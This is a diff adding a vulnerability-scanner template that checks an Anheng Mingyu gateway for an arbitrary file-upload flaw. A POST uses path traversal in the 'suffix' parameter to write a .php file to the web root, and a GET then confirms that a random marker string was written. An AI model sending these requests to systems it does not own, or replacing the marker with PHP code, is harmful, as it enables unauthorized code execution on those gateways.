@@ -1,0 +1,28 @@
+cve-id: anheng-mingyu-aaa_local_web_preview-fileupload
+set:
+  boundary: randomLowercase(32)
+  file_name: randomLowercase(8)
+  rand: randomLowercase(5)
+rules:
+- method: POST
+  path: /webui/?g=aaa_local_web_preview&name=123&read=0&suffix=/../../../{{file_name}}.php
+  headers:
+    Content-Type: multipart/form-data; boundary={{boundary}}
+    Accept-Encoding: gzip
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+  body: |
+    --{{boundary}}
+    Content-Disposition: form-data; name="123"; filename="9B9Ccd.php"
+    Content-Type: text/plain
+    
+    {{rand}}
+    --{{boundary}}--
+  expression: 'response.status ==  200 '
+- method: GET
+  path: /{{file_name}}.php
+  headers:
+    User-Agent: Mozilla/5.0 (Macintosh;T2lkQm95X0c= Intel Mac OS X 10_14_3) AppleWebKit/605.1.15
+      (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+  expression: 'response.status ==  200 && response.body.bcontains(b"{{rand}}") '
+severity: critical
+type: fileupload
